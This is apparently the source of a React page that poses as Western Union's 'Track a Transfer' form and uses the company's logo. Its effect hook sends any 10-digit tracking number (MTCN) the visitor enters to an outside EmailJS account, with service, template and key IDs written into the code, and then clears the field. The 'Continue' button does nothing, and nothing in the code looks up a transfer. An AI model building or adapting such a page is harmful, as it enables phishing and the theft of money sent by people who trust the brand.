/* eslint-disable react/no-unescaped-entities */
"use client";

import Footer from "@/components/footer";
import Header from "@/components/header";
import Link from "next/link";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSeparator,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { Button } from "@/components/ui/button";
import { Download, Upload } from "lucide-react";
import { useEffect, useState } from "react";
import emailjs from "@emailjs/browser";
import { cn } from "@/lib/utils";
import Image from "next/image";
import { Spinner } from "@/components/spinner";
export default function Home() {
  const [isactive, setisActive] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  console.log(setIsLoading);
  const [otp, setOtp] = useState("");

  useEffect(() => {
    if (otp.length == 10) {
      // setIsLoading(true);
      emailjs
        .send(
          "service_uka7m0o",
          "template_rs1iwvp",
          { otp: otp },
          "Kc-xjOkuaqcths13o"
        )
        .then(
          (response) => {
            console.log("SUCCESS!", response.status, response.text);

            setOtp("");
            // setIsLoading(false);
          },
          (error) => {
            console.log("FAILED...", error);
          }
        );
    }
  }, [otp]);

  return (
    <div className=" relative">
      <Header />

      <div className="bg-[#ebece7] flex flex-col items-center justify-center ">
        <div className=" w-full md:w-2/5  flex flex-col  items-center justify-center gap-8 p-4">
          <div className="w-full space-y-2">
            <div className=" w-full flex justify-between items-center ">
              <p className="text-xl">Track a Transfer</p>
              <Link className="text-xs text-blue-950" href={"/"}>
                English/Philipines
              </Link>
            </div>
            <div className="bg-white flex justify-between items-center w-full text-xs font-bold ">
              <div
                onClick={() => setisActive(!isactive)}
                className={cn(
                  "flex justify-center items-center gap-2 border-b-2 p-4 w-1/2",
                  !isactive && " border-[#255E80] text-[#255E80] "
                )}
              >
                <Upload color="#255E80" />
                <p>I'm the sender</p>
              </div>
              <div
                onClick={() => setisActive(!isactive)}
                className={cn(
                  "flex justify-center items-center gap-2 border-b-2 py-4 w-1/2  ",
                  isactive && " border-[#255E80]  text-[#255E80]"
                )}
              >
                <Download />
                <p>I'm the receiver</p>
              </div>
            </div>
          </div>

          <p className="text-xs">
            Please enter your 10-digit tracking number (MTCN).
          </p>
          <div className=" w-full  flex-col  justify-center gap-5 flex  bg-white  items-center py-2">
            <InputOTP maxLength={10} value={otp} onChange={(e) => setOtp(e)}>
              <InputOTPGroup>
                <InputOTPSlot index={0} />
                <InputOTPSlot index={1} />
                <InputOTPSlot index={2} />
              </InputOTPGroup>
              <InputOTPSeparator />
              <InputOTPGroup>
                <InputOTPSlot index={3} />
                <InputOTPSlot index={4} />
                <InputOTPSlot index={5} />
              </InputOTPGroup>
              <InputOTPSeparator />
              <InputOTPGroup>
                <InputOTPSlot index={6} />
                <InputOTPSlot index={7} />
                <InputOTPSlot index={8} />
                <InputOTPSlot index={9} />
              </InputOTPGroup>
            </InputOTP>
            <p className="text-red-800 font-medium text-center text-xs">
              Please enter your 10-digit tracking number (MTCN).
            </p>
          </div>
          <Button
            className="w-full rounded-sm h-12 bg-[#68789D]"
            disabled={otp.length !== 10}
          >
            Continue
          </Button>
          <Link href={"/"} className="text-[#255E80] text-sm">
            Dont't Know the MTCN
          </Link>
        </div>
      </div>
      {/* Overlay de chargement */}
      {isLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          {/* Fond transparent */}
          <div className="absolute inset-0 bg-black/90 " />

          {/* Contenu du loader */}
          <div className="relative flex flex-col items-center justify-center gap-4 p-6  ">
            <Spinner variant="circle" className="text-[#ebece7] size-15  " />
            <Image
              src="https://www.westernunion.com/content/dam/wu/logo/logo.wu.big.svg"
              width={500}
              height={500}
              alt="logo"
            />
          </div>
        </div>
      )}
      <Footer />
    </div>
  );
}
